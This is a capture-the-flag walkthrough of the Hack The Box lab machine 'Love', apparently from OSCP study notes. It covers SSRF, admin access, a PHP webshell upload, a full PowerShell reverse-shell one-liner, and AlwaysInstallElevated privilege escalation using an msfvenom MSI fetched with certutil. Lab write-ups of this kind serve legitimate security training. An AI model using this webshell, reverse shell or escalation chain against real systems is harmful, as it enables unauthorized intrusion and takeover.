## Love

Difficulty: Easy

### User Flag

```
rustscan -a love.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/9a31e1d8-6ac5-4e79-84c6-226e4241af8a)

<br>

A lot of ports are open, the most intersting ones are: 80, 443 and 5000.  

The nmap result of port 443, return us a subdomain called: stating.love.htb.  

The website on port 80 has a login form that we can SQL Inject, but nothing interesting will come up.

![nmapSubdomain](https://github.com/b1d0ws/OSCP/assets/58514930/dd2c9f3c-1dd8-47a8-8dcf-9cfc6bb9efea)

![website](https://github.com/b1d0ws/OSCP/assets/58514930/71fddd0c-da92-4a5d-88c0-e7a3e129defe)

<br>

If we try to access port 5000, we got a forbidden response.

![forbidden](https://github.com/b1d0ws/OSCP/assets/58514930/d96f15ee-8641-43e0-8432-3d3f842d3d63)

<br>

On subdomain, there is a functionality that scan file that we can insert URLs.  

We can abuse this to trigger SSRF to access port 5000 with 127.0.0.1:5000.  

![subdomainSSRF](https://github.com/b1d0ws/OSCP/assets/58514930/2f2d842d-a122-4cb5-8dfa-b40b1e25d7ff)

<br>

We find this credentials, but on the website the login form requests a Voter ID.  

Enumerating the website with GoBuster, we find /admin directory and there we can use this credentials.

![goBuster](https://github.com/b1d0ws/OSCP/assets/58514930/102945f5-54b5-4c91-8d12-11062eefaa8d)

![websiteAdmin](https://github.com/b1d0ws/OSCP/assets/58514930/d31dedce-941d-4484-be43-1296e07730d0)

<br>

Logged in, we can upload a webshell on "Voters" on Photo and use it to get a reverse shell with powershell.

```
webshell.php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>

reverse payload
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.21',3333);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

![uploadingWebshell](https://github.com/b1d0ws/OSCP/assets/58514930/d8f620dd-8907-41ba-bf33-18d12d286447)

![webshell](https://github.com/b1d0ws/OSCP/assets/58514930/d7615fbc-bd2a-49be-abd7-e12b71ae22fc)

<br>

### Root Flag

Running winPeas, we find AlwaysInstallElevated privileges. 

![winPeas](https://github.com/b1d0ws/OSCP/assets/58514930/44254c7f-7f34-4371-8407-7aacb4c42ef7)

<br>

[This article](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated) teaches how to explore this to escalate privileges.

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.21 LPORT=1337 -f msi > shell.msi

certutil -urlcache -f http://10.10.14.21/shell.msi shell.msi

msiexec /quiet /qn /i file.msi
```

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/fa8730f0-86ec-4d58-91cf-f7c665eb86ee)
